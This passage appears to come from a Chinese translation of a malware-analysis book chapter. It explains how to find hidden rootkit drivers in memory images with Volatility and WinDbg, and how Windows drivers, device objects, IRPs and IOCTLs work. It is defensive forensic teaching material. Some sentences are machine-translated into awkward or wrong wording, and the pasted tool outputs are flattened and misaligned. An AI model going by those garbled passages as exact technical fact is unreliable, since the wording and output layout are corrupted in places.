恶意程序(如rootkit)可以加载内核驱动程序以内核模式运行代码。一旦它在内核空间中运行，它就可以访问内部操作系统代码，并可以监视系统事件，通过修改内部数据结构、钩子函数和修改调用表来逃避检测。内核模式驱动程序的扩展名通常是.sys，它驻留在%windir%\\system32\\drivers中。一个内核驱动通常是通过创建一个内核驱动服务类型的服务来加载的(如第7章，恶意软件的功能和持久性，在服务部分)。\nWindows实现了各种安全机制，旨在防止在内核空间中执行未经授权的代码。这使得rootkit很难安装内核驱动程序。在64位Windows上，Microsoft实现了内核模式代码签名(KMCS)，它要求对内核模式驱动程序进行数字签名，以便加载到内存中。另一种安全机制是内核补丁保护(KPP)，也被称为PatchGuard，它可以防止对核心系统组件、数据结构和调用表(如SSDT、IDT等)的修改。这些安全机制对大多数rootkit是有效的，但与此同时，这迫使攻击者想出先进的技术，允许他们安装未签名的驱动程序，并绕过这些安全机制。一种方法是安装Bootkit。Bootkit会感染系统启动过程的早期阶段，甚至在操作系统完全加载之前。另一种方法是利用内核或第三方驱动程序中的漏洞来安装无签名驱动程序。在本章的其余部分，我们将假设攻击者已经成功安装了内核模式驱动程序(使用Bootkit或通过利用内核级漏洞)，我们将重点讨论内核内存取证，其中包括识别恶意驱动程序。\n在一个干净的windows系统上，您会发现数百个内核模块，因此找到恶意内核模块需要一些工作。在下面的部分中，我们将研究一些用于定位和提取恶意内核模块的常用技术。我们将从列出内核模块开始。\n5. 清单内核模块 要列出内核模块，可以使用modules插件。这个插件依赖于行走双向链表的元数据结构(KLDR_DATA_TABLE_ENTRY)指出PsLoadedModuleList(这种技术类似于行走_EPROCESS双向链表的结构,如第十章所述,狩猎恶意软件使用内存取证,在理解ActiveProcessLinks部分)。清单内核模块可能并不总是帮助你识别恶意内核驱动程序的数以百计的加载内核模块,但是它可以用于发现一个可疑的指标如一个内核驱动程序有一个奇怪的名字,或从非标准内核模块加载路径或临时路径。内核模块的模块插件列表的顺序加载,这意味着如果一个rootkit司机最近安装了,你很可能会发现模块的列表,提供模块不是隐藏和系统内存映像收购之前没有重启。\n在下面的例子中，一个被Laqma rootkit感染的内存映像中，模块列表显示了Laqma的恶意驱动程序lanmandrv.sys，位于列表的最后，从C:\\Windows\\System32目录运行，而大多数其他内核驱动程序是从SystemRoot\\System32\\drivers加载的。从清单中,您还可以看到,等核心操作系统组件NT内核模块(ntkrnlpa.exe或ntoskrnl.exe)和硬件抽象层(hal.dll)加载第一,紧随其后的是引导驱动(比如kdcom.dll)在引导时自动启动,然后跟着其他驱动:\n$ python vol.py -f laqma.vmem --profile=Win7SP1x86 modules Volatility Foundation Volatility Framework 2.6 Offset(V) Name Base Size File ---------- ------------ ---------- -------- ------------------------------ --- 0x84f41c98 ntoskrnl.exe 0x8283d000 0x410000 \\SystemRoot\\system32\\ntkrnlpa.exe 0x84f41c20 hal.dll 0x82806000 0x37000 \\SystemRoot\\system32\\halmacpi.dll 0x84f41ba0 kdcom.dll 0x80bc5000 0x8000 [REMOVED] 0x86e36388 srv2.sys 0xa46e1000 0x4f000 \\SystemRoot\\System32\\DRIVERS\\srv2.sys 0x86ed6d68 srv.sys 0xa4730000 0x51000 \\SystemRoot\\System32\\DRIVERS\\srv.sys 0x86fe8f90 spsys.sys 0xa4781000 0x6a000 \\SystemRoot\\system32\\drivers\\spsys.sys 0x861ca0d0 lanmandrv.sys 0xa47eb000 0x2000 \\??\\C:\\Windows\\System32\\lanmandrv.sys \\SystemRoot\\system32\\kdcom.dll 由于浏览双链接列表容易受到DKOM攻击(在第10章，使用内存取证查找恶意软件，4.2.1节直接内核对象操作(DKOM)中描述)，通过解除链接可以从列表中隐藏内核驱动程序。为了克服这个问题，您可以使用另一个名为modscan的插件。modscan插件依赖于池标签扫描方法(在第10章，使用内存取证来捕获恶意软件，4.2.2理解池标签扫描)。换句话说，它扫描物理地址空间，寻找与内核模块相关的池标记(MmLd)。通过池标签扫描，可以检测到未链接的模块和之前加载的模块。modscan插件以它们在物理地址空间中被找到的顺序显示内核模块，而不是基于它们被加载的顺序。下面以Necurs rootkit为例，modscan插件显示的恶意内核驱动程序(2683608180e436a1.sys)的名称完全由十六进制字符组成:\n$ python vol.py -f necurs.vmem --profile=Win7SP1x86 modscan Volatility Foundation Volatility Framework 2.6 Offset(P) Name Base Size File ------------------ -------------------- ---------- ------ -------- 0x0000000010145130 Beep.SYS \\SystemRoot\\System32\\Drivers\\Beep.SYS 0x000000001061bad0 secdrv.SYS \\SystemRoot\\System32\\Drivers\\secdrv.SYS 0x00000000108b9120 rdprefmp.sys \\SystemRoot\\system32\\drivers\\rdprefmp.sys 0x00000000108b9b10 USBPORT.SYS 0x9711e000 0x4b000 \\SystemRoot\\system32\\DRIVERS\\USBPORT.SYS 0x0000000010b3b4a0 rdbss.sys 0x96ef6000 0x41000 \\SystemRoot\\system32\\DRIVERS\\rdbss.sys [REMOVED] 0x000000001e089170 2683608180e436a1.sys 0x851ab000 0xd000 \\SystemRoot\\System32\\Drivers\\2683608180e436a1.sys 0x000000001e0da478 usbccgp.sys 0x9700b000 0x17000 \\SystemRoot\\system32\\DRIVERS\\usbccgp.sys 当您运行模块插件针对感染Necurs rootkit的内存映像时，它不会显示恶意驱动程序(2683608180e436a1.sys):\n$ python vol.py -f necurs.vmem --profile=Win7SP1x86 modules | grep 2683608180e436a1由于modscan使用池标记扫描方法，它可以检测未加载的模块(假设内存没有被覆盖)，因此恶意驱动程序2683608180e436a1是有可能的。Sys被迅速加载和卸载，或者被隐藏起来。要确认驱动程序是被卸载还是被隐藏，你可以使用unloaddmodules插件，它会显示被卸载的模块列表以及每个模块被卸载的时间。在下面的输出中，无恶意驱动,2683608180e436a1.Sys，告诉你这个驱动程序没有被卸载，它是隐藏的。从下面的输出中，您可以看到另一个恶意驱动程序2b9fb.Sys，以前是快速加载和卸载的(没有出现在modules和modscan清单中，如下面的输出所示)。unloaddmodules插件可以在检测rootkit试图快速加载和卸载驱动的过程中被证明是有用的，这样它就不会出现在模块列表中:\n$ python vol.py -f necurs.vmem --profile=Win7SP1x86 unloadedmodules Volatility Foundation Volatility Framework 2.6 Name StartAddress EndAddress Time ----------------- ------------ ---------- ------------------- dump_dumpfve.sys 0x00880bb000 0x880cc000 2016-05-11 12:15:08 dump_LSI_SAS.sys 0x00880a3000 0x880bb000 2016-05-11 12:15:08 dump_storport.sys 0x0088099000 0x880a3000 2016-05-11 12:15:08 parport.sys 0x0094151000 0x94169000 2016-05-11 12:15:09 2b9fb.sys 0x00a47eb000 0xa47fe000 2018-05-21 10:57:52 $ python vol.py -f necurs.vmem --profile=Win7SP1x86 modules | grep -i 2b9fb.sys $ python vol.py -f necurs.vmem --profile=Win7SP1x86 modscan | grep -i 2b9fb.sys5.1 使用驱动程序列出内核模块 列出内核模块的另一种方法是使用driverscan插件，如下面的输出所示。driverscan插件从名为DRIVER_OBJECT的结构中获取与内核模块相关的信息。具体来说，driverscan插件使用池标记扫描来查找物理地址空间中的驱动程序对象。第一列Offset(P)指定了发现DRIVER_OBJECT结构的物理地址，第二列Start包含模块的基址，Driver Name列显示了Driver的名称。例如，驱动程序的名称\\driver\\Beep与Beep.Sys，最后一项显示恶意 驱动程序，\\Driver\\2683608180e436a1，与Necurs rootkit关联。driverscan插件是列出内核模块的另一种方式，当rootkit试图隐藏模块和modscan插件时，它会很有用:\n$ python vol.py -f necurs.vmem --profile=Win7SP1x86 driverscan Volatility Foundation Volatility Framework 2.6 Offset(P) Start Size Service Key Name Driver Name ------------------ -------- ------- ----------- ------ ----------- 0x00000000108b9030 0x88148000 0x8000 RDPENCDD RDPENCDD \\Driver\\RDPENCDD 0x00000000108b9478 0x97023000 0xb7000 DXGKrnl DXGKrnl \\Driver\\DXGKrnl 0x00000000108b9870 0x88150000 0x8000 RDPREFMP RDPREFMP \\Driver\\RDPREFMP 0x0000000010b3b1d0 0x96ef6000 0x41000 rdbss rdbss \\FileSystem\\rdbss 0x0000000011781188 0x88171000 0x17000 tdx tdx \\Driver\\tdx 0x0000000011ff6a00 0x881ed000 0xd000 kbdclass kbdclass \\Driver\\kbdclass 0x0000000011ff6ba0 0x880f2000 0x7000 Beep Beep \\Driver\\Beep [REMOVED] 0x000000001e155668 0x851ab000 0xd000 2683608180e436a1 26836...36a1 \\Driver\\2683608180e436a1 要列出使用内核调试器(Windbg)的内核模块，请如下所示使用lm k命令。对于详细输出，可以使用lm kv命令:\nkd\u003e lm k start end module name 80bb4000 80bbc000 kdcom (deferred) 82a03000 82a3a000 hal (deferred) 82a3a000 82e56000 nt (pdb symbols) 8b200000 8b20e000 WDFLDR (deferred) 8b20e000 8b22a800 vmhgfs (deferred) 8b22b000 8b2b0000 mcupdate_GenuineIntel (deferred) 8b2b0000 8b2c1000 PSHED (deferred) 8b2c1000 8b2c9000 BOOTVID (deferred) 8b2c9000 8b30b000 CLFS (deferred) [REMOVED]识别出恶意内核模块后，可以使用moddump插件将其从内存转储到磁盘。要将模块转储到磁盘，您需要指定模块的基本地址，您可以从modules、modscan或driverscan插件获得该基本地址。以将Necurs rootkit的恶意驱动通过其基址转储到磁盘为例，如下所示:\n$ python vol.py -f necurs.vmem --profile=Win7SP1x86 moddump -b 0x851ab000 - D dump/ Volatility Foundation Volatility Framework 2.6 Module Base Module Name Result ----------- -------------- ------ 0x0851ab000 UNKNOWN OK: driver.851ab000.sys6. I/O处理 在讨论driverscan插件时，我提到过driverscan从DRIVER_OBJECT结构中获取模块信息。你想知道DRIVER_OBJECT结构是?这一点很快就会清楚。在本节中，您将了解用户模式和内核模式组件之间的交互、设备驱动程序的角色以及它与I/O管理器的交互。通常，一个rootkit由一个用户模式组件(EXE或DLL)和一个内核模式组件(设备驱动程序)组成。rootkit的用户模式组件使用特定的机制与内核模式组件通信。从取证的角度来看，必须了解这些通信的工作方式以及所涉及的组件。本节将帮助您理解通信机制，并为接下来的主题奠定基础。\n让我们试着理解当用户模式应用程序执行输入/输出(I/O)操作时发生了什么，以及在高级别上如何处理它。在讨论在第8章API调用流时,代码注入和连接(在Windows API调用流部分),我使用一个用户模式应用程序的示例使用WriteFile () API执行写操作,而最终调用NtWriteFile()系统服务程序在内核中执行(ntoskrnl.exe),然后将请求定向到I/O管理器，然后I/O管理器请求设备驱动程序执行I/O操作。在这里，我将再次详细讨论这个主题，重点是内核空间组件(主要是设备驱动程序和I/O管理器)。下面的图表说明了写请求的流程(其他类型的I/O请求，如read类似;它们只是使用了不同的api): 以下几点讨论了设备驱动程序和I/O管理器在高级别上的角色:\n设备驱动程序通常创建一个或多个设备，并指定它可以为该设备处理什么类型的操作(打开、读取和写入)。它还指定处理这些操作的例程的地址。这些例程称为分派例程或IRP处理程序。 在创建设备之后，驱动程序会发布该设备，以便用户模式应用程序可以访问它。 用户模式应用程序可以使用API调用，如CreateFile，来打开处理发布的设备，并使用ReadFile和WriteFile API对设备进行读写等I/O操作。用于对文件进行I/O操作的api(如CreateFile、ReadWrite、WriteFile)也适用于设备。这是因为设备被视为一个虚拟文件。 当用户模式应用程序在发布的设备上执行I/O操作时，请求被路由到I/O管理器。I/O管理器通过传递IRP (I/O请求包)来确定处理设备的驱动程序，并请求驱动程序完成操作。IRP是一种数据结构，它包含关于执行什么操作以及I/O操作所需的缓冲区的信息。 驱动程序读取IRP，验证它，并在通知I/O管理器操作的状态之前完成所请求的操作。然后，I/O管理器将状态和数据返回给用户应用程序。\n在这个阶段，前面的几点可能对您来说很陌生，但不要因此而气馁:当您完成这一部分时，您就会清楚了。接下来，我们将研究设备驱动程序的角色，然后是I/O管理器的角色。\n6.1 设备驱动程序的角色 当驱动加载到系统中时，I/O管理器创建一个驱动对象(DRIVER_OBJECT结构)。然后，I/O管理器调用驱动程序的初始化例程，DriverEntry(类似于main()或WinMain()函数)，通过传递一个指针到DRIVER_OBJECT结构作为参数。一个驱动对象(DRIVER_OBJECT结构)代表系统上的一个单独的驱动。DriverEntry例程将使用DRIVER_OBJECT用驱动的各种入口点来填充它，以处理特定的I/O请求。通常，在DriverEntry例程中，驱动程序创建一个代表逻辑或物理设备的设备对象(DEVICE_OBJECT结构)。设备是通过一个叫做IoCreateDevice或IoCreateDevice-Secure的API创建的。当驱动程序创建一个设备对象时，它可以有选择地为设备分配名称，它也可以创建多个设备。设备创建后，指向第一个创建的设备的指针在驱动程序对象中更新。为了帮助您更好地理解这一点，让我们列出已加载的内核模块，并查看一个简单内核模块的驱动程序对象。对于本例，我们将检查null.sys内核驱动程序。根据Microsoft文档，Null设备驱动程序在Unix环境中提供了与\\dev\\Null等价的功能。当系统在内核初始化期间启动时阶段,null.Sys被加载到系统中。在内核模块清单中，您可以看到这个null.Sys被装载在基地地址8bcde000:\nkd\u003e lm k start end module name 80ba2000 80baa000 kdcom (deferred) 81e29000 81e44000 luafv (deferred) [REMOVED] 8bcde000 8bce5000 Null (deferred)当null.sys加载后，它的驱动对象(DRIVER_OBJECT结构)将在驱动初始化期间填充元数据信息。让我们看看它的驱动程序对象，以了解它包含什么样的信息。可以使用!drvobj扩展名命令显示驱动对象信息。从下面的输出中，驱动程序对象表示为空。Sys的地址是86a33180。设备对象列表下面的值86aa2750是指向null.sys创建的设备对象的指针。如果驱动程序创建了多个设备，你会在设备对象列表中看到多个条目:\nkd\u003e !drvobj Null Driver object (86a33180) is for: \\Driver\\Null Driver Extension List: (id , addr) Device Object list: 86aa2750你可以使用驱动程序对象地址86a33180来检查_DRIVER_OBJECT结构为空。可以通过dt (display type)命令查看。从下面的输出中，您可以看到DriverStart字段保存了驱动程序的基址(0x8bcde000)，DriverSize字段包含驱动的大小(0x7000)，driverame是驱动对象的名称(\\ driver \\Null)。DriverInit字段保存驱动初始化例程(DriverEntry)的指针。DriverUnload字段包含指向驱动程序卸载例程的指针，它通常会在卸载过程中释放驱动程序创建的资源。MajorFunction字段是最重要的字段之一，它指向包含28个主要函数指针的表。这个表将使用分派例程的地址填充，我们将在本节的后面讨论MajorFunction表。前面介绍的driverscan插件会对驱动对象进行池标记扫描，并通过读取这些字段来获取与内核模块相关的信息，如基址、大小和驱动名称:\nkd\u003e dt nt!_DRIVER_OBJECT 86a33180 +0x000 Type : 0n4 +0x002 Size : 0n168 +0x004 DeviceObject : 0x86aa2750 _DEVICE_OBJECT +0x008 Flags : 0x12 +0x00c DriverStart : 0x8bcde000 Void +0x010 DriverSize : 0x7000 +0x014 DriverSection : 0x86aa2608 Void +0x018 DriverExtension : 0x86a33228 _DRIVER_EXTENSION +0x01c DriverName : _UNICODE_STRING \"\\Driver\\Null\" +0x024 HardwareDatabase : 0x82d86270 _UNICODE_STRING \"\\REGISTRY\\MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\" +0x028 FastIoDispatch : 0x8bce0000 _FAST_IO_DISPATCH +0x02c DriverInit : 0x8bce20bc long Null!GsDriverEntry+0 +0x030 DriverStartIo : (null) +0x034 DriverUnload : 0x8bce1040 void Null!NlsUnload+0 +0x038 MajorFunction : [28] 0x8bce107cDRIVER_OBJECT结构中的DeviceObject字段包含驱动程序(null.sys)创建的设备对象的指针。您可以使用设备对象地址0x86aa2750来确定驱动程序创建的设备名称。在这种情况下，Null是驱动程序Null.sys创建的设备名称:\nkd\u003e !devobj 86aa2750 Device object (86aa2750) is for: Null \\Driver\\Null DriverObject 86a33180 Current Irp 00000000 RefCount 0 Type 00000015 Flags 00000040 Dacl 8c667558 DevExt 00000000 DevObjExt 86aa2808 ExtensionFlags (0x00000800) DOE_DEFAULT_SD_PRESENT Characteristics (0x00000100) FILE_DEVICE_SECURE_OPEN Device queue is not busy.您还可以通过在display type (dt)命令旁边指定设备对象地址来查看实际的DEVICE_OBJECT结构，如下面的代码所示。如果驱动程序创建了多个设备，那么DEVICE_OBJECT结构中的NextDevice字段将指向下一个设备对象。由于null.sys driver只创建一个设备，NextDevice字段设置为空:\nkd\u003e dt nt!_DEVICE_OBJECT 86aa2750 +0x000 Type : 0n3 +0x002 Size : 0xb8 +0x004 ReferenceCount : 0n0 +0x008 DriverObject : 0x86a33180 _DRIVER_OBJECT +0x00c NextDevice : (null) +0x010 AttachedDevice : (null) +0x014 CurrentIrp : (null) +0x018 Timer : (null) +0x01c Flags : 0x40 +0x020 Characteristics : 0x100 +0x024 Vpb : (null) +0x028 DeviceExtension : (null) +0x02c DeviceType : 0x15 +0x030 StackSize : 1 '' [REMOVED]从前面的输出中，您可以看到DEVICE_OBJECT包含一个指向驱动对象的DriverObject字段。换句话说，关联的驱动程序可以从设备对象中确定。这就是当I/O管理器接收到特定设备的I/O请求时，它可以确定相关驱动程序的方式。这个概念可以通过以下图表来可视化: 您可以使用GUI工具，如DeviceTree (http://www.osronline.com/article.cfm?article=97)查看驱动程序创建的设备。下面是一个工具的屏幕截图，显示了Null设备创建的Null.sys驱动: 当一个驱动程序创建一个设备时，设备对象被放置在Windows对象管理器命名空间的\\device目录中。要查看对象管理器的名称空间信息，可以使用WinObj工具(https://docs.microsoft.com/en-us/sysinternals/downloads/WinObj)。下面的截图显示了Null创建的设备Null.sys在\\Device目录下。你也可以看到其他驱动程序创建的设备:\n运行在用户模式下的应用程序无法访问在\\device目录下创建的设备。换句话说，如果用户模式应用程序想要在设备上执行I/O操作，它不能通过传递设备的名称(如\\device\\Null)作为CreateFile函数的参数直接打开设备句柄。CreateFile函数不仅仅用于创建或打开文件，它还可以用于打开设备的句柄。如果用户模式应用程序不能访问设备，那么它如何执行I/O操作?为了让用户模式应用程序可以访问设备，驱动程序需要发布设备。这是通过创建到设备的符号链接来完成的。驱动程序可以使用内核API IoCreateSymbolicLink来创建符号链接。当为一个设备(如\\device\\Null)创建一个符号链接时，您可以在\\GLOBAL??对象管理器名称空间中的目录，也可以使用WinObj工具。在下面的截图中，您可以看到NUL是通过null.sys驱动的名为为\\Device\\Null设备创建的符号链接。 符号链接也被称为MS-DOS设备名。用户模式应用程序可以简单地使用符号链接的名称(MS-DOS设备名)来使用约定打开设备句柄 \\.\u003csymboliclink name\u003e。例如，要打开\\Device\\Null的句柄，用户模式应用程序必须只传递\\.\\NUL作为CreateFile函数的第一个参数(lpFilename)，它返回设备的文件句柄。具体地说，对象管理器目录GLOBAL中的任何符号链接。可以使用CreateFile函数打开。如下图所示，C:卷只是一个到\\Device\\HarddiskVolume1的符号链接。在Windows操作系统中，I/O操作是在虚拟文件上进行的。换句话说，设备、目录、管道和文件都被视为虚拟文件(可以使用CreateFile函数打开): 此时，您知道驱动程序在其初始化过程中创建设备，并使用符号链接将其发布给用户应用程序使用。现在，问题是，驱动程序如何告诉I/O管理器它支持设备的什么类型的操作(打开、读、写，等等)?在初始化期间，驱动程序通常做的另一件事是用DRIVER_OBJECT结构中分派例程的地址更新Major函数表(分派例程数组)。通过查看主要函数表，您可以了解驱动程序支持的操作类型(打开、读取、写入等)，以及与特定操作关联的调度例程的地址。主函数表是一个包含28个函数指针的数组;索引值0到27表示一个特定的操作。例如，索引值0对应于主函数代码IRP_MJ_CREATE，索引值3对应于主函数代码IRP_MJ_READ，以此类推。换句话说，如果应用程序想打开一个文件或设备对象的句柄，请求将被发送到I/O管理器，然后使用将IRP_MJ_CREATE主函数代码作为主函数表的索引，以查找将处理此请求的调度例程的地址。与读取操作相同，使用IRP_MJ_READ作为索引来确定分派例程的地址。\n以下!drvobj命令显示由null.sys驱动程序填充的分派例程数组。驱动程序不支持的操作指向ntoskrnl.exe (nt)中的IopInvalidDeviceRequest。根据这个信息，你可以判断为null.sys仅支持IRP_MJ_CREATE (open)、IRP_MJ_CLOSE (close)、IRP_MJ_READ (read)、IRP_MJ_WRITE (write)、IRP_MJ_QUERY_INFORMATION(查询信息)、IRP_MJ_LOCK_CONTROL(锁控制)操作。执行任何支持的操作的任何请求都将被分派到适当的分派例程。例如，当用户应用程序执行写操作时，对设备的写请求将被分配到MajorFunction[IRP_MJ_WRITE]函数，该函数恰好位于null.sys驱动的卸载程序中的8bce107c地址。在nul.Sys的情况下，所有受支持的操作都分派给同一个操作地址,8bce107c。通常情况下，情况并非如此;你会看到不同的例程地址用于处理不同的操作:\nkd\u003e !drvobj Null 2 Driver object (86a33180) is for: \\Driver\\Null DriverEntry: 8bce20bc Null!GsDriverEntry DriverStartIo: 00000000 DriverUnload: 8bce1040 Null!NlsUnload AddDevice: 00000000 Dispatch routines: [00] IRP_MJ_CREATE [01] IRP_MJ_CREATE_NAMED_PIPE [02] IRP_MJ_CLOSE [03] IRP_MJ_READ [04] IRP_MJ_WRITE [05] IRP_MJ_QUERY_INFORMATION [06] IRP_MJ_SET_INFORMATION [07] IRP_MJ_QUERY_EA [08] IRP_MJ_SET_EA [09] IRP_MJ_FLUSH_BUFFERS [0a] IRP_MJ_QUERY_VOLUME_INFORMATION 82ac5fbe nt!IopInvalidDeviceRequest [0b] IRP_MJ_SET_VOLUME_INFORMATION [0c] IRP_MJ_DIRECTORY_CONTROL [0d] IRP_MJ_FILE_SYSTEM_CONTROL [0e] IRP_MJ_DEVICE_CONTROL 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest [0f] IRP_MJ_INTERNAL_DEVICE_CONTROL 82ac5fbe nt!IopInvalidDeviceRequest [10] IRP_MJ_SHUTDOWN [11] IRP_MJ_LOCK_CONTROL [12] IRP_MJ_CLEANUP [13] IRP_MJ_CREATE_MAILSLOT [14] IRP_MJ_QUERY_SECURITY [15] IRP_MJ_SET_SECURITY [16] IRP_MJ_POWER [17] IRP_MJ_SYSTEM_CONTROL [18] IRP_MJ_DEVICE_CHANGE [19] IRP_MJ_QUERY_QUOTA [1a] IRP_MJ_SET_QUOTA [1b] IRP_MJ_PNP 82ac5fbe nt!IopInvalidDeviceRequest 8bce107c Null!NlsUnload+0x3c 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 82ac5fbe nt!IopInvalidDeviceRequest 您还可以在DeviceTree工具中查看支持的操作，如下截图所示: 此时，您知道驱动程序创建了设备，将其发布给用户应用程序使用，并且它还更新调度例程数组(主函数表)，告诉I/O管理器它支持什么操作。现在，让我们看看I/O管理器的角色是什么，并理解如何将从用户应用程序接收的I/O请求分派给驱动程序。\n6.2 I/O管理器的角色 当I/O请求到达I/O管理器时，I/O管理器会定位驱动程序并创建一个IRP (I/O请求包)，这是一个包含描述I/O请求信息的数据结构。对于读、写等操作，由I/O管理器创建的IRP还在内核内存中包含一个缓冲区，驱动程序使用它来存储从设备读取的数据或将写入设备的数据。然后，由I/O管理器创建的IRP被传递给正确的驱动程序的调度例程。驱动程序接收到IRP, IRP包含描述操作(打开、读或写)的主要函数代码(IRP_MJ_XXX)。在开始I/O操作之前，驱动程序执行检查以确保一切正常(例如，为读或写操作提供的缓冲区足够大)，然后启动I/O操作。如果需要在硬件设备上执行I/O操作，驱动程序通常会经过HAL例程。在完成它的工作之后，驱动程序将IRP返回给I/O管理器，要么让它知道所请求的I/O操作已经完成，要么因为它必须被传递给另一个驱动程序，以便在驱动程序堆栈中进行进一步的处理。如果任务完成，I/O管理器将释放IRP，或者将IRP传递给设备堆栈中的下一个驱动程序来完成IRP。任务完成后，I/O管理器将状态和数据返回给用户模式应用程序。\n此时，您应该了解了I/O管理器的角色。有关I/O系统和设备驱动程序的详细信息，请参阅Pavel Yosifovich、Alex Ionescu、Mark E. Russinovich和David A. Solomon的著作《Windows Internals, Part 1: 7th Edition》。\n6.3 与设备驱动程序通信 现在，让我们回顾一下用户模式组件和内核模式组件之间的交互。我们会回到null.sys的例子驱动程序从用户模式触发对其设备(\\device\\Null)的写操作，并监视IRP发送到Null.sys的系统驱动程序。为了监视发送给驱动程序的IRP包，我们可以使用IrpTracker工具(https://www.osronline.com/article.cfm?article=199)。要以管理员身份监视IrpTracker的启动，单击File | Select Driver并输入驱动程序的名称(在本例中为null)，如下面的截图所示，然后选择OK按钮: 现在，要触发I/O操作，可以打开命令提示符并键入以下命令。这将把字符串\"hello\"写入空设备。如前所述，符号链接名称是用户模式应用程序(如cmd.exe)可以使用的名称;这就是我指定设备符号链接名称(NUL)来写入内容的原因:\nC:\\\u003eecho \"hello\" \u003e NUL设备被视为一个虚拟文件，在写入设备之前，设备的句柄将使用CreateFile()(一个用于创建/打开文件或设备的API)打开。CreateFile() API最终将调用ntoskrnl.exe中的NtCreateFile()，它将请求发送给I/O管理器。I/O管理器根据符号链接名称找到与设备相关联的驱动程序，并调用与IRP_MJ_CREATE主函数代码相对应的调度例程。打开设备句柄后，使用WriteFile()执行写操作，它将调用NtWriteFile。这个请求将由I/O管理器分派到与IRP_MJ_WRITE主函数代码相对应的驱动程序例程。下面的截图显示了对IRP_MJ_CREATE和IRP_MJ_WRITE对应的驱动调度例程的调用和它们的完成状态: 此时，您应该了解执行I/O操作的用户模式代码如何与内核模式驱动程序通信。Windows支持另一种机制，它允许用户模式代码直接与内核模式设备驱动程序通信。这是使用称为DeviceIoControl的通用API(由kernel32.dll导出)完成的。这个API接受设备的句柄作为参数之一。它接受的另一个参数是控制代码，称为IOCTL (I/O控制)代码，它是一个32位整数值。每个控制代码标识要执行的特定操作以及执行该操作的设备类型。用户态应用程序可以打开设备句柄(使用CreateFile)，调用DeviceIoControl，并通过Windows操作系统提供的标准控制代码，对设备进行直接的输入输出操作，如硬盘驱动器、磁带驱动器、光盘驱动器等。另外，一个设备驱动程序(一个rootkit驱动程序)可以定义它自己的特定于设备的控制代码，rootkit的用户模式组件可以使用这些代码通过DeviceIoControl API与驱动程序通信。当用户模式组件通过传递IOCTL代码来调用DeviceIoControl时，它会在ntdll.dll中调用NtDeviceIoControlFile，它会将线程转换到内核模式，并在Windows执行程序ntoskrnl.exe中调用系统服务例程NtDeviceIoControlFile。Windows执行程序调用I/O管理器，I/O管理器构建一个包含IOCTL代码的IRP包，然后将其路由到由IRP_MJ_DEVICE_CONTROL标识的内核调度例程。下面的图表说明了用户模式代码和内核模式驱动程序之间通信的概念: 6.4 I/O请求分层驱动 到目前为止，您已经了解了I/O请求是如何由单个驱动程序控制的简单设备处理的。I/O请求可以经过多层驱动程序;分层驱动程序的I/O处理也以同样的方式进行。下面的截图展示了一个I/O请求如何在到达基于硬件的设备之前通过分层驱动程序的例子: 通过一个示例可以更好地理解这个概念，所以让我们触发一个写操作使用以下命令到c:\\abc.txt。当执行该命令时，netstat将打开abc.txt的句柄并写入:\nC:\\Windows\\system32\u003enetstat -an -t 60 \u003e C:\\abc.txt这里要注意的一点是文件名(C:\\abc.txt)还包括文件所在设备的名称，即卷C:是符号链接的名称HarddiskVolume1(你可以使用WinObj工具验证它，如前所述)。这意味着写操作将被路由到与设备\\device\\HarddiskVolume1相关联的驱动程序。当netstat.exe打开abc.txt时，I/O管理器创建一个文件对象(FILE_OBJECT结构)，并在返回netstat.exe句柄之前，将指向设备对象的指针存储在文件对象中。下面这张来自ProcessHacker工具的截图显示了已被netstat.exe打开的C:\\abc.txt的句柄。对象地址0x85f78ce8表示文件对象: 可以使用对象地址检查文件对象(FILE_OBJECT)，如下所示。从输出中，可以看到FileName字段包含文件名称，DeviceObject字段包含指向设备对象(DEVICE_OBJECT)的指针:\nkd\u003e dt nt!_FILE_OBJECT 0x85f78ce8 +0x000 Type : 0n5 +0x002 Size : 0n128 +0x004 DeviceObject : 0x868e7e20 _DEVICE_OBJECT +0x008 Vpb : 0x8688b658 _VPB +0x00c FsContext : 0xa74fecf0 Void [REMOVED] +0x030 FileName : _UNICODE_STRING \"\\abc.txt\" +0x038 CurrentByteOffset : _LARGE_INTEGER 0xe000正如前面提到的，从设备对象中，可以确定设备的名称和相关的驱动程序。这就是I/O管理器决定将I/O请求传递给哪个驱动程序的方式。下面的输出显示设备的名称HarddiskVolume1及其关联的驱动程序volmgr.sys。attachddevice字段告诉您有一个未命名的设备对象(868e7b28)与fvevol.sys驱动位于设备堆栈中设备对象HarddiskVolume1的顶部:\nkd\u003e !devobj 0x868e7e20 Device object (868e7e20) is for: HarddiskVolume1 \\Driver\\volmgr DriverObject 862e0bd8 Current Irp 00000000 RefCount 13540 Type 00000007 Flags 00201150 Vpb 8688b658 Dacl 8c7b3874 DevExt 868e7ed8 DevObjExt 868e7fc0 Dope 86928870 DevNode 86928968 ExtensionFlags (0x00000800) DOE_DEFAULT_SD_PRESENT Characteristics (0000000000) AttachedDevice (Upper) 868e7b28 \\Driver\\fvevol Device queue is not busy.要确定I/O请求通过的驱动层，可以使用!devstack内核调试器命令，并传递设备对象地址来显示与特定设备对象关联的(分层设备对象的)设备堆栈。下面的输出显示了与\\device\\HarddiskVolume1关联的设备堆栈，该设备由volmgr.sys所有。第四列中的\u003e字符告诉您，该条目与设备HarddiskVolume1相关联，该行上面的条目是在volmgr.sys之上分层的驱动程序列表。这意味着I/O请求将首先被I/O管理器传递给volsnap.sys。根据请求的类型，volsnap.sys可以处理IRP请求，并将请求发送到堆栈中的其他驱动程序，最终到达volmgr.sys:\nkd\u003e !devstack 0x868e7e20 !DevObj !DrvObj !DevExt ObjectName 85707658 \\Driver\\volsnap 85707710 868e78c0 \\Driver\\rdyboost 868e7978 868e7b28 \\Driver\\fvevol 868e7be0 \u003e 868e7e20 \\Driver\\volmgr 868e7ed8 